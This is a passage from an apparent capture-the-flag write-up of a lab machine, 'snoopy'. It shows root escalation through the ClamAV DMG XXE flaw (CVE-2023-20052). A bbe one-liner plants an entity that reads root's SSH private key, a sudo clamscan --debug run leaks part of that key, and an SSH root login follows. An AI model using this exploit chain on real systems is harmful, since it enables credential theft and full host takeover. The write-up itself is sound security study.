No DDM! Just doing one huge blkx then...
run 0: sectors=208, left=208
Writing XML data...
Generating UDIF metadata...
Master checksum: 32dd518b
Writing out UDIF resource file...
Cleaning up...
Done
root@ec8a06805207:/exploit# bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
root@ec8a06805207:/exploit# ls -al
total 276
drwxr-xr-x 2 1000 1000   4096 Aug  4 18:55 .
drwxr-xr-x 1 root root   4096 Aug  4 18:55 ..
-rw-r--r-- 1 1000 1000  24963 Aug  4 18:52 1.png
-rw-r--r-- 1 1000 1000  22855 Aug  4 18:52 2.png
-rw-r--r-- 1 1000 1000    556 Aug  4 18:52 Dockerfile
-rw-r--r-- 1 1000 1000    859 Aug  4 18:52 README.md
-rw-r--r-- 1 root root  51826 Aug  4 18:55 exploit.dmg
-rw-r--r-- 1 root root  51876 Aug  4 18:55 test.dmg
-rw-r--r-- 1 root root 106496 Aug  4 18:55 test.img
root@ec8a06805207:/exploit# exit
exit
```

After transferring the exploit, `exploit.dmg` to the `/home/sbrown/scanfiles/` directory to satisfy the regex pattern, because of the debug flag I was able to read root's identity key, allowing me to gain SSH access with escalated privileges, i.e., root.

```bash
sbrown@snoopy:~/scanfiles$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib
LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0
LibClamAV debug: Initialized 1.0.0 engine
...snip...
...snip...
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf
hy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSw
...snip...
```

```bash
> ssh root@snoopy.htb -i id_rsa.root
...snip...
root@snoopy:~# id
uid=0(root) gid=0(root) groups=0(root)
root@snoopy:~# ls -la
total 21744
drwx------  7 root root     4096 May 12 21:29 .
drwxr-xr-x 19 root root     4096 Apr 25 18:38 ..
lrwxrwxrwx  1 root root        9 Mar 26 00:50 .bash_history -> /dev/null
-rw-r--r--  1 root root     3106 Oct 15  2021 .bashrc
drwx------  3 root root     4096 Mar 18 16:57 .cache
drwx------  3 root root     4096 Apr 25 10:42 .config
drwx------  3 root root     4096 Mar 18 17:02 .docker
-rw-r--r--  1 root root      161 Jul  9  2019 .profile
drwx------  2 root root     4096 Mar 25 13:07 .ssh
-rw-------  1 root root      837 May 12 21:29 .viminfo
-rw-r--r--  1 root root 13379846 Nov 28  2022 clamav-1.0.0.linux.x86_64.deb
-rwxr-x---  1 root root      218 May  7 17:07 clean.sh
drwxr-xr-x  4 root root     4096 Mar 24 22:17 containers
-rw-r--r--  1 root root      916 Mar 27 03:23 db.snoopy.htb
-rw-r--r--  1 root root  5566650 Mar 19 03:04 git_2.34.1-1ubuntu1.6_amd64.deb
-rwxr-xr-x  1 root root      215 May 12 21:29 named_restore.sh
-rw-r-----  1 root root       33 Aug  4 05:47 root.txt
-rw-r--r--  1 root root  3252796 May  7 17:06 sudo_1.9.13-4_ubu2204_amd64.deb
root@snoopy:~#
```

Pwned!!

<!-- ![Pwned](https://i.imgur.com/tZhu1eM.png) -->

---
# Related Links

- [Updating DNS Records Systematically When Using External DNS](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/linux_domain_identity_authentication_and_policy_guide/dns-updates-external#dns-update-external-nsupdate)
- [linux - how to update Records using nsupdate? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/131883/how-to-update-records-using-nsupdate)
- [DNS (Domain Name Systems) Pentesting | Exploit Notes](https://exploit-notes.hdks.org/exploit/dns/dns-pentesting/#update-dns-zone)
- [nsupdate Command - IBM Documentation](https://www.ibm.com/docs/en/aix/7.3?topic=n-nsupdate-command)
- [aiosmtpd - An asyncio based SMTP server documentation](https://aiosmtpd.readthedocs.io/en/latest/)
- [Cowrie’s documentation](https://cowrie.readthedocs.io/en/latest/)
- [Git security vulnerabilities announced - The GitHub Blog](https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/)
- ["git apply" overwriting paths outside the working tree · Advisory · git/git](https://github.com/git/git/security/advisories/GHSA-r87m-v37r-cwfh)
- [openembedded-core/meta/recipes-devtools/git/files/CVE-2023-23946.patch](https://github.com/victronenergy/openembedded-core/blob/aa7f0169a4a77a29c859a3678be389a729da7387/meta/recipes-devtools/git/files/CVE-2023-23946.patch#L47)
- [apply: fix writing behind newly created symbolic links · git/git@fade728](https://github.com/git/git/commit/fade728df1221598f42d391cf377e9e84a32053f)
- [How to Prevent the CVE-2023-20052 ClamAV XXE Vulnerability](https://www.pingsafe.com/blog/cve-2023-20052-cisco-clamav-xxe-vulnerability/)
- [CVE-2023-20052 · GitHub Advisory Database](https://github.com/advisories/GHSA-pcr4-7r58-755h)
- [nokn0wthing/CVE-2023-20052: CVE-2023-20052, information leak vulnerability in the DMG file parser of ClamAV](https://github.com/nokn0wthing/CVE-2023-20052)
